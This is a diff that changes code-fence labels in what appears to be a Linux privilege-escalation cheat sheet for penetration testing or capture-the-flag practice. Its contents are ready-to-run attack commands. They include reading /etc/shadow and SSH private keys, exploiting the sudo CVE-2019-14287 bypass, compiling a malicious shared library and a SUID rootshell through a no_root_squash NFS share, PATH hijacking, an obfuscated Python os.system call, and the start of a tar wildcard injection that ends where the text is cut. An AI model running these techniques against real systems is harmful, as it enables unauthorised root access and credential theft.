@@ -1,71 +1,71 @@
 ## Enumeration
 ### Display general overview of current user
-```nix
+```bash
 id
 ```
 ### Get hostname of target machine
-```nix
+```bash
 hostname
 ```
 ### Print kernel information
-```nix
+```bash
 uname -a
 ```
 ### Print additional kernel information
-```nix
+```bash
 cat /proc/version
 ```
 ### View all running processes
-```nix
+```bash
 ps -A
 ```
 ### View process tree
-```nix
+```bash
 ps axjf
 ```
 ### Display processes of all users, process’ owners, non terminal attached processes
-```nix
+```bash
 ps aux
 ```
 ### View environment variables
-```nix
+```bash
 env
 ```
 ### Check user’s sudo privileges
-```nix
+```bash
 sudo -l
 ```
 ### View all system users
-```nix
+```bash
 cat /etc/passwd | cut -d ":" -f 1
 ```
-```nix
+```bash
 cat /etc/passwd | grep home
 ```
 ### View terminal command history
-```nix
+```bash
 history
 ```
 ### View network interfaces within the system
-```nix
+```bash
 ifconfig
 ```
 ### View network routes within the system
-```nix
+```bash
 ip route
 ```
 ### View listening ports and connections within the system
-```nix
+```bash
 netstat -a
 
 Note: add "t" or "u" to list TCP or UDP results i.e netstat -at
 ```
 ### Find all readable files by the current user
-```nix
+```bash
 find /etc -maxdepth 1 -readable -type f
 ```
 ### Find backups within the system
-```nix
+```bash
 # ! in this instance means "not equals to"
 find / -newermt "date_from" ! -newermt "date_to" -ls
 
@@ -73,42 +73,42 @@ find / -newermt "date_from" ! -newermt "date_to" -ls
 | grep -v ' /etc\\| /var/lib\\| /sys\\| /proc\\| /boot' 2> /dev/null
 ```
 ### Find SUID binaries
-```nix
+```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;
 ```
-```nix
+```bash
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 ```
 ### Find capabilities
-```nix
+```bash
 getcap -r / 2>/dev/null
 ```
 ### View NFS configuration
-```python
+```bash
 cat /etc/exports
 ```
 ### View scheduled tasks
-```nix
+```bash
 crontab -l
 ```
-```nix
+```bash
 ls -al /etc/cron* /etc/at*
 ```
-```nix
+```bash
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
 ### View installed software
 Debian based distribution
-```nix
+```bash
 dpkg -l
 ```
 CentOS based distribution
-```nix
+```bash
 rpm -qa
 ```
 ### Check ASLR status
 Value of `1` if ASLR is enabled, otherwise value is `0`
-```nix
+```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 ```
 ### Using automated scripts
@@ -118,26 +118,26 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 Search SUID and follow instructions provided by [https://gtfobins.github.io/](https://gtfobins.github.io/)
 ### Sudo vulnerability CVE-2019-14287
 If `sudo -l` returned `(ALL, !root)` and is below version 1.8.28, this method might work.
-```nix
+```bash
 sudo -u#-1
 ```
 Read more at [https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)
 ### Sudo using absolute path
 If `sudo -l` returned `(ALL) NOPASSWD: /path/to/bin /path/to/file`, this method might work.
-```nix
+```bash
 sudo /path/to/bin /path/to/file
 ```
 ### View sensitive files if apache2 is in sudo privileges
-```nix
+```bash
 sudo apache2 -f /etc/shadow
 ```
 ### Misconfigured executable permission on a folder
 If a folder has executable permissions, commands can be used to view its contents
-```nix
+```bash
 Total 1
 drwx--x--x  2 admin        admin        4096 Jul  3  2020 secret
 ```
-```nix
+```bash
 cat secret/.ssh/id_rsa
 ```
 ### Abusing Unix capabilities
@@ -151,21 +151,21 @@ static void init() {
     execl("/bin/sh", "sh", NULL);
 }
 ```
-```nix
+```bash
 gcc -fPIC -o exploit.o -c exploit.c && gcc -shared -o exploit.so -lcrypto exploit.o
 ```
-```nix
+```bash
 openssl req -engine ./exploit.so
 ```
 Another example using Python
-```nix
+```bash
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
 ### Hijacking relative PATHs
 This is only applicable when a binary is calling another binary using relative path instead of an absolute path. The binary being called can be replaced by a malicious one with the same name but on a different directory, preferably in `/tmp` or `/dev/shm`. More information can be found [here](https://youtu.be/PgQyuogGgPI?t=4140).
 - `chmod 600 /file` is a relative path
 - `/usr/bin/chmod 600 /file` is an absolute path
-```nix
+```bash
 PATH=/tmp:$PATH /target_file/calling_relative/path_binary
 ```
 ### Python module manipulation
@@ -190,14 +190,14 @@ __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lowe
 ```
 ### Abusing NFS misconfiguration no_root_squash
 Check if NFS share can be mounted on your local machine
-```nix
+```bash
 showmount -e 10.10.10.10
 ```
 Create a `/tmp/mount` and mount NFS share on your local machine to the created folder
-```nix
+```bash
 mkdir /tmp/mount
 ```
-```nix
+```bash
 mount -o rw,vers=2 10.10.10.10:/nfs /tmp/mount
 ```
 Create `rootshell.c` and compile it
@@ -212,19 +212,19 @@ int main() {
 gcc rootshell.c -o rootshell
 ```
 Copy `rootshell` executable to the mounted share and set SUID bit
-```nix
+```bash
 cp rootshell /tmp/mount
 ```
-```nix
+```bash
 chmod +s /tmp/mount/rootshell
 ```
 On target host, run the `rootshell` executable to gain root shell
-```nix
+```bash
 /tmp/rootshell
 ```
 ## TAR Wildcard Injection
 If a command is calling for a wildcard we may be able to inject a command instead. This is possible by tricking the `tar` command into running arbitrary commands as root using a wildcard injection. This works by using the `--checkpoint` and `--checkpoint-action` flags accepted by `tar`. Example of a vulnerable command:
-```nix
+```bash
 tar -cf /opt/backups/website.tar *
 ```
 In order to exploit this, we run the following commands inside the `/opt/backups` directory:
